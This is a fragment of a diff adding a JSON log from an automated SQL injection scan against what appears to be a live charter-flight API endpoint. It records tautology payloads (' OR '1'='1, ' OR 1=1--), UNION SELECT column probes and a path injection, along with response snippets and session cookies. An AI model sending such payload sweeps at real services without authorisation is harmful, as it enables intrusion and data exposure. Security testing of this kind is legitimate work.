+        "status": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7104251384735107,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364892518,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:42 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-ySJLDFha8Z72D2zfgkoy/h7Hxzs\"",
+        "set-cookie": "sails.sid=s%3AOQV9rQstm9tpy6uAK7z9zkl8OYzXJOPO.s%2FQhCWZwvPdaginHGwpY2TeX6KstEWcLsjmr6R9TRLU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_status",
+      "params": {
+        "status": "') OR ('1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7939412593841553,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:44 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-seN2BhfRWwCh7M2P90nblg8Mxxo\"",
+        "set-cookie": "sails.sid=s%3Ag7kfcb-JY9qphFJCZ-HeQPdRqX99xD8o.hH%2FkX2jeEvrl0GoPIRSbiG4JTBfndQLzZc0KQ64flSI; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_search",
+      "params": {
+        "search": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7684390544891357,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:46 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-XzFGZf2cBUchrFHptoFYOv+KonA\"",
+        "set-cookie": "sails.sid=s%3AN1I3SYnLSYYRwGVOF1E875dfdxkodZdL.QhncqHWzxB7nRSnGNyzP6qxtGUsada04JU%2BlRBrK%2B2o; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_search",
+      "params": {
+        "search": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.6333038806915283,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:48 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-PnAfcNBx6jyigbP+GS47iUawR+k\"",
+        "set-cookie": "sails.sid=s%3AcFkzhHHASYJIxQsVqn_RJd_G1sJAp750.xUz526%2FdnATBxGYz5zlNN%2FiYwzThMjaQYpruJHZjZu0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_search",
+      "params": {
+        "search": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 2.1112170219421387,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:50 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AXdsQRsa2qoQ4boAkVPWX0Z3vI-nktsiq.LbPFIaZI7376Mhy%2BlLhkJgg5vLtTXf4J0wEPipHFMJ0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_search",
+      "params": {
+        "search": "') OR ('1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.6378529071807861,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:51 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3Afx-OfBFsEBvfbi-ULs_-sd3gOlYTT4x9.38RuzODnfRe7mr9Un7QWlf5ErPYZsTOaiYmGkSt3Sxs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_filter",
+      "params": {
+        "filter": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.5588669776916504,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:53 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3Apga-SWZdAm6bIMONiKZ8Ie3vpkTmAtY3.cOQCCx0tfP3CL0%2FeDPmrBimHMXkRZ1Tlg3HsqSQyq6M; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_filter",
+      "params": {
+        "filter": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4407274723052979,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:54 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AYiEqXnPRx4wKcavkkk0whUhN1s6JfH-2.VOjRoZs5qtV6inhNoyqHkSvpNiX95ud%2Fmzr1tKJTHyQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_filter",
+      "params": {
+        "filter": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.5454349517822266,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:56 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AagYJO2QUMxFQ0DyPmbBKAVy8qKIdWSXq.pEUpubO%2F2mqWSUkKQYT1n6asCwXkEzhfAdu6j00TF%2Fk; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_filter",
+      "params": {
+        "filter": "') OR ('1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.897292137145996,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:58 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3A3dRpwC4uVZUXHaYipJNi0Bx4mNS-nRtl.ALM%2F4%2BtCIz6NGnsdx0l5cnrWC%2BAj9Qu6H51hN%2F%2F6%2FAg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_includeExpired",
+      "params": {
+        "includeExpired": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4686496257781982,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:59 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AnsIxyP5hUAOxERSzPKunFqDzqCFyYh8E.JC7u3wYDn2R5Hcp%2BccorAJH3aaUruHgbnE4hpg7%2BtKQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_includeExpired",
+      "params": {
+        "includeExpired": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.673769474029541,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:01 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AYDmSDq-2oqkcC8A0WpJivWpKQs5BnQdq.%2BVz57d8tMK3pIBBMQzFfYEEQaAIhk7SwDeEjX8g9%2BEA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_includeExpired",
+      "params": {
+        "includeExpired": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.8890206813812256,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:03 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AlfJ5MI1KjqkLK76eS83gsQrUGoj9r1NJ.AQAH9Ws0jjzBGjx55olsv%2Ff4XK7E%2Fp7R0oy%2FPa3Yig0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "flight_query_includeExpired",
+      "params": {
+        "includeExpired": "') OR ('1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.923724889755249,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:05 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3A2WII-lOxh7fuzlmscKvQUpPglwO4_w2s.4uq7scRVJ5bkFLB8lbE61ctgDvk7%2B9zURhONy4BCuNU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "union_based_flight",
+      "params": {
+        "id": "' UNION SELECT NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4413928985595703,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:06 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3ANsrENxXoy2lB3kfi93j3KU928XGeJist.3ZdXwL6uySvh9lFoo%2F9JMStTumD0DgObMPftMMS41TY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "union_based_flight",
+      "params": {
+        "id": "' UNION SELECT NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.4150495529174805,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:08 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3A--27kriVDohzdLSHGfciglO7W1xIzT8P.7ZOJgEWlmAdD3%2F7xsMfXqpCuV%2FcbOC3SNs07BHGfks4; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "union_based_flight",
+      "params": {
+        "id": "' UNION SELECT NULL,NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7433476448059082,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:10 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3A_7Mjv7csAIQfYXY_jam0wRVV09yp-NpY.w0Sdh7F59B9c8Dds2brTGZG06uUD0QbORDx5b0cxdAw; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "union_based_flight",
+      "params": {
+        "id": "' UNION SELECT NULL,NULL,NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.692350149154663,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:11 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3AaRDIvPYQffv2dbLLkqvOltyo-0wGNEJV.0SAUjp0kaceN9TfH8%2Bq24bVp4iwT%2FzMu%2F7ko9nEoGDQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight",
+      "method": "GET",
+      "test_type": "union_based_flight",
+      "params": {
+        "id": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 298843,
+      "elapsed_time": 1.7187786102294922,
+      "response_snippet": "[{\"createdAt\":1727370667113,\"updatedAt\":1762364923060,\"id\":5422,\"deletedAt\":null,\"uuid\":\"eda4249e-5699-40ec-98a5-5b182bdf552c\",\"departDateTime\":\"2024-09-27T19:00:00.000Z\",\"departDateTimeLocal\":\"2024-09-27T14:00\",\"arriveDateTime\":null,\"arriveDateTimeLocal\":\"2024-09-27T14:48\",\"closeoutDateTime\":\"2024-09-26T19:00:00.000Z\",\"waitlistCloseAlertSent\":false,\"numberOfEntrants\":2,\"bannerUrl\":\"https://volatostorage.blob.core.windows.net/cities/002af750-a1b2-482e-9880-fca93dc3abb4.png\",\"charterPrice\":1600,\"",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:13 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"48f60-7fLJ6+TxUdcOWS9GmBQmDsZ16DA\"",
+        "set-cookie": "sails.sid=s%3A6aS52qEg-0_s1hVo7hvIRto5BLy4FFTG.1o%2BGJeEV2LVQWDlCT1AM7VxaHRCMFFw4c%2FPWmjroKgY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/flight/%27%20OR%20%271%27%3D%271",
+      "method": "GET",
+      "test_type": "flight_path_injection",
+      "params": null,
+      "json_data": null,
+      "status_code": 404,
+      "response_length": 9,
+      "elapsed_time": 0.12392044067382812,
+      "response_snippet": "Not Found",
+      "headers": {
+        "content-length": "9",
+        "content-type": "text/plain; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:13 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"9-0gXL1ngzMqISxa6S1zx3F4wtLyg\"",
+        "set-cookie": "sails.sid=s%3AG0pKGlHE6inikc5QgPDgtEndyjJs07Qb.iwJd%2BKgxj5HVj6On1VjWuYpWwQQ6pz6ahYkU8vUgHxI; Path=/; HttpOnly",
+        "vary": "Accept-Encoding"
+      }
